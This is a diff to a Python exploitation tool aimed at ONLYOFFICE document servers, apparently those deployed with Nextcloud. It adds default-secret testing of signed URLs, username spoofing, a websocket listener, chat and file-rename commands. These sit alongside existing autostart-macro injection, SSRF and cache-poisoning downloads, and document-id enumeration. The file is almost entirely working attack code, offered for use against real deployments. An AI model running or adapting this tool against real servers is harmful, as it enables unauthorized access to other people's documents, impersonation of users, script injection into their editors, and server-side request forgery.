@@ -1,12 +1,15 @@
 #!/usr/bin/python3
 # Exploit ONLYOFFICE implementations
 
-import argparse, sys, re, time, signal, requests, uuid, json, tempfile, os, subprocess, websocket, base64
-from urllib.parse import urlparse
+import argparse, sys, re, time, signal, requests, uuid, json, tempfile, os, subprocess, websocket, base64, threading, hashlib
+from urllib.parse import urlparse, parse_qs
 import concurrent.futures
 
 def process_fileparts( txt ):
   txt = txt.replace(r'\"','"')[3:-2]
+  m = re.search(r'([0-9]\+)\/Editor\.bin\/',txt)
+  if m:
+    print('DL:',m.group(1))
   data = json.loads(txt)
   print(data)
   tmpdir = tempfile.mkdtemp()
@@ -31,26 +34,51 @@ def process_fileparts( txt ):
   subprocess.check_output(['x2t/x2t',infile,outfile])
   # subprocess.check_output(['open',outfile])
 
+# See if a signed URL is signed by a default secret
+def test_secret_string( signedurl, secret='verysecretstring' ):
+  h = get_url_signature( signedurl, secret )
+  u = urlparse( signedurl )
+  q = parse_qs( u.query )
+  if q['md5'][0] == h:
+    print('Cypto secret is:', secret)
+
+def get_url_signature( url, secret ):
+  u = urlparse( url )
+  q = parse_qs( u.query )
+  s = q['expires'][0] + u.path.replace('/ds-vpath','') + secret
+  m = hashlib.md5()
+  m.update(s.encode('utf8'))
+  h = base64.b64encode(m.digest()).decode('utf8').strip().replace('+','-').replace('/','_').replace('=','')
+  return h
+
+def sign_url( url, secret ):
+  h = get_url_signature( url, secret )
+  return url + '&md5=' + h
+
+
 class WsClient():
 
-  def __init__( self, url, docid, platform ):
-    
+  autodownload=False
+  testsecret=True
+
+  def __init__( self, url, docid, platform, username='admin' ):
     self.docid = docid
     self.platform = platform
     self.url = url
+    self.username = username
     self.connect()
 
   def connect( self ):
-    if self.url.startswith('http'):
-      self.url = re.sub(r'^http','ws', self.url)
-    
+    self.url = re.sub(r'^http(s)?','ws\g<1>',self.url)
+
     if self.platform == 'nextcloud':
       self.url = self.url + '/ds-vpath/doc/'+self.docid+'/c/1/a/websocket'
 
-    print( self.url )
+    print( 'Connecting to', self.url )
     self.ws = websocket.create_connection( self.url )
-    print( self.recv() )
-    print( self.recv() )
+
+    # Spawn socket listener
+    self.spawn_listener()
 
   def send( self, message ):
     if type( message ) != str:
@@ -59,28 +87,81 @@ class WsClient():
     print(message)
     self.ws.send( message )
 
+  def send_json( self, data ):
+    data = json.dumps([json.dumps(data)])
+    self.send( data )
+
   def recv( self ):
     return self.ws.recv()
 
+  def recv_listen( self ):
+    while True:
+      msg = self.recv()
+      if msg.startswith('a["{'):
+        try:
+          data = json.loads(json.loads(msg[1:])[0])
+          print("RECV:", data['type'] )
+          if data['type'] == 'message':
+            for m in data['messages']:
+              print(m['username']+':',m['message'])
+          elif data['type'] == 'documentOpen':
+            if self.testsecret:
+              test_secret_string( data['data']['data']['Editor.bin'] )
+          elif data['type'] == 'rpc':
+            print(data)
+          else:
+            print('')
+        except:
+          print("RECV:", msg)
+      else:
+        print("RECV:", msg)
+      if self.autodownload and 'Editor.bin' in msg:
+        process_fileparts(msg)
+
+  def spawn_listener( self ):
+    self.listener = threading.Thread( target=self.recv_listen )
+    self.listener.start()
+
+  def send_chat_message( self, msg ):
+    # ["{\"type\":\"message\",\"message\":\"Egg!\"}"]
+    data = json.dumps([json.dumps({
+      'type': 'message',
+      'message': msg 
+    })])
+    self.send( data )
+
+  def get_messages( self ):
+    self.send_json({"type":"getMessages"})
+
+  def chat( self ):
+    print('\nChat mode\n=========\nType messages, ENTER to send\n')
+    self.get_messages()
+    while True:
+      msg = input('> ')
+      self.send_chat_message(msg.strip())
+
+  def rename( self, name ):
+    self.send_json(
+    {
+      "type":"rpc",
+      "data": {
+        'type': 'wopi_RenameFile',
+        'name': name
+      }
+    })
 
   def auth( self, docurl='' ):
-    txt = r'["{\"type\":\"auth\",\"docid\":\"'+self.docid+r'\",\"token\":\"a\",\"user\":{\"id\":\"a\",\"username\":\"a\",\"firstname\":null,\"lastname\":null,\"indexUser\":-1},\"editorType\":0,\"lastOtherSaveTime\":-1,\"block\":[],\"sessionId\":null,\"sessionTimeConnect\":null,\"sessionTimeIdle\":0,\"documentFormatSave\":65,\"view\":false,\"isCloseCoAuthoring\":false,\"openCmd\":{\"c\":\"open\",\"id\":\"'+self.docid+r'\",\"userid\":\"a\",\"format\":\"docx\",\"url\":\"'+docurl+r'\",\"title\":\"whatever.docx\",\"lcid\":2057,\"nobase64\":false},\"lang\":null,\"mode\":null,\"permissions\":{\"edit\":true},\"IsAnonymousUser\":false}"]'
+    txt = r'["{\"type\":\"auth\",\"docid\":\"'+self.docid+r'\",\"token\":\"a\",\"user\":{\"id\":\"a\",\"username\":\"'+self.username+r'\",\"firstname\":null,\"lastname\":null,\"indexUser\":-1},\"editorType\":0,\"lastOtherSaveTime\":-1,\"block\":[],\"sessionId\":null,\"sessionTimeConnect\":null,\"sessionTimeIdle\":0,\"documentFormatSave\":65,\"view\":false,\"isCloseCoAuthoring\":false,\"openCmd\":{\"c\":\"open\",\"id\":\"'+self.docid+r'\",\"userid\":\"a\",\"format\":\"docx\",\"url\":\"'+docurl+r'\",\"title\":\"whatever.docx\",\"lcid\":2057,\"nobase64\":false},\"lang\":null,\"mode\":null,\"permissions\":{\"edit\":true},\"IsAnonymousUser\":false}"]'
     self.send( txt )
-    print( self.recv() )
-    count = 1
-    while count < 3:
-      # print( 'Count:', count )
-      result = self.recv()
-      print("Received '%s'" % result)
-      if 'Editor.bin' in result:
-        print( 'Found docid:', self.docid )
-        process_fileparts(result)
-        break;
-      count += 1
+    # print( self.recv() )
+    # count = 1
+    # while count < 3:
+    #   # print( 'Count:', count )
+    #   result = self.recv()
+    #   count += 1
     
 
   def save_changes( self, changes ):
-    # ["{\"type\":\"saveChanges\",\"changes\":\"[\\\"78;AgAAADEA//8BAH7tVXlc7AEARwEAAAEAAAACAAAAAgAAAAIAAAAEAAAABAAAABwAAAA2AC4ANAAuADEALgA0ADUALgBAAEAAUgBlAHYA\\\",\\\"670;HgAAAF8AbQBhAGMAcgBvAHMARwBsAG8AYgBhAGwASQBkAAEAAAAAAAAANgEAAHsAIgBtAGEAYwByAG8AcwBBAHIAcgBhAHkAIgA6AFsAewAiAG4AYQBtAGUAIgA6ACIATQBhAGMAcgBvAHMAIAAxACIALAAiAHYAYQBsAHUAZQAiADoAIgAoAGYAdQBuAGMAdABpAG8AbgAoACkAXABuAHsAXABuACAAIAAgACAAYQBsAGUAcgB0ACgAMgApADsAXABuAH0AKQAoACkAOwAiACwAIgBnAHUAaQBkACIAOgAiADgANQBiADUAMwA5AGEANABjADkANAAxADQAOAAzAGIAOAAxADYANgA5ADAAYgBiAGUAOAA0ADAANAA1AGYAZAAiACwAIgBhAHUAdABvAHMAdABhAHIAdAAiADoAdAByAHUAZQB9AF0ALAAiAGMAdQByAHIAZQBuAHQAIgA6ADAAfQA2AQAAewAiAG0AYQBjAHIAbwBzAEEAcgByAGEAeQAiADoAWwB7ACIAbgBhAG0AZQAiADoAIgBNAGEAYwByAG8AcwAgADEAIgAsACIAdgBhAGwAdQBlACIAOgAiACgAZgB1AG4AYwB0AGkAbwBuACgAKQBcAG4AewBcAG4AIAAgACAAIABhAGwAZQByAHQAKAAxACkAOwBcAG4AfQApACgAKQA7ACIALAAiAGcAdQBpAGQAIgA6ACIAOAA1AGIANQAzADkAYQA0AGMAOQA0ADEANAA4ADMAYgA4ADEANgA2ADkAMABiAGIAZQA4ADQAMAA0ADUAZgBkACIALAAiAGEAdQB0AG8AcwB0AGEAcgB0ACIAOgB0AHIAdQBlAH0AXQAsACIAYwB1AHIAcgBlAG4AdAAiADoAMAB9AA==\\\"]\",\"startSaveChanges\":true,\"endSaveChanges\":true,\"isCoAuthoring\":false,\"isExcel\":false,\"deleteIndex\":18,\"excelAdditionalInfo\":\"{\\\"lm\\\":\\\"oc9gn4ob06oo_admin2\\\",\\\"SYg\\\":\\\"oc9gn4ob06oo_admin\\\",\\\"wTg\\\":\\\"14;BgAAADgAMQA0AAAAAAA=\\\"}\",\"unlock\":false,\"releaseLocks\":false}"]
     message = {
       'type':'saveChanges',
       'startSaveChanges':True,
@@ -103,7 +184,6 @@ class WsClient():
 
 
   def inject_macro( self, macrotxt ):
-    # _macrosGlobalId6{"macrosArray":[{"name":"Macros 1","value":"(function()\n{\n    alert(2);\n})();","guid":"85b539a4c941483b816690bbe84045fd","autostart":true}],"current":0}6{"macrosArray":[{"name":"Macros 1","value":"(function()\n{\n    alert(1);\n})();","guid":"85b539a4c941483b816690bbe84045fd","autostart":true}],"current":0}
     payload = json.dumps({
       "macrosArray":[{
         "name":"Macro 1",
@@ -113,13 +193,8 @@ class WsClient():
       }],
       "current":0
     })
-
-    print('Payload length:', len(payload))
-
     data = b'\x1e\x00\x00\x00\x5f\x00\x6d\x00\x61\x00\x63\x00\x72\x00\x6f\x00\x73\x00\x47\x00\x6c\x00\x6f\x00\x62\x00\x61\x00\x6c\x00\x49\x00\x64\x00\x01\x00\x00\x00\x00\x00\x00\x00' +(2 * len(payload)).to_bytes(2,byteorder='little')+b'\x00\x00' + bytes(payload, 'utf16')[2:] + b'\x00\x00\x00\x00'
-    print( data )
     changes = [str(len(data))+';'+base64.b64encode(data).decode('utf8')]
-    print(changes)
     self.save_changes( changes )
 
 
@@ -127,11 +202,10 @@ def main():
   parser = argparse.ArgumentParser(description="ONLYOFFICE exploitation tool")
   parser.add_argument('-u', '--url', help='Base URL of the site running ONLYOFFICE')
   parser.add_argument('-d', '--docid', help='id of the document')
+  parser.add_argument('-U', '--username', help='Username to spoof')
   parser.add_argument('-D', '--docurl', help='Document URL to download to OO cache for the current docid (SSRF, unix: pipes supported)', default='')
   parser.add_argument('-p', '--platform', default='nextcloud', help='What the underlying platform is')
   subparsers = parser.add_subparsers(dest='command')
-
-  # TODO: Start a separate thread to handle received websocket messages
 
   # Download
   dlparse = subparsers.add_parser('dl')
@@ -143,6 +217,13 @@ def main():
   # Enumerate cached doc ids
   enumparse = subparsers.add_parser('enum')
   enumparse.add_argument('docids', help='text file containing doc ids to test')
+
+  # Chat
+  chatparse = subparsers.add_parser('chat')
+
+  # Rename
+  rnparse = subparsers.add_parser('rename')
+  rnparse.add_argument("filename",help='Filename to rename to')
 
   args = parser.parse_args()
 
@@ -159,21 +240,30 @@ def main():
         client.auth()
     sys.exit(0)
 
-  client = WsClient( args.url, args.docid, args.platform )
+  client = WsClient( args.url, args.docid, args.platform, username=args.username )
 
   # Macro injection
   if args.command == 'macro':
     with open(args.script, 'r') as f:
       client.auth()
+      print('Injecting',args.script)
       client.inject_macro(f.read())
 
   # Poison document cache with external URL
   # SSRF
   if args.command == 'dl':
+    client.autodownload = True
     client.auth( args.docurl )
 
+  # Chat
+  if args.command == 'chat':
+    client.auth()
+    client.chat()
 
-
+  # Rename
+  if args.command == 'rename':
+    client.auth()
+    client.rename( args.filename )
 
 if __name__ == '__main__':
   main()
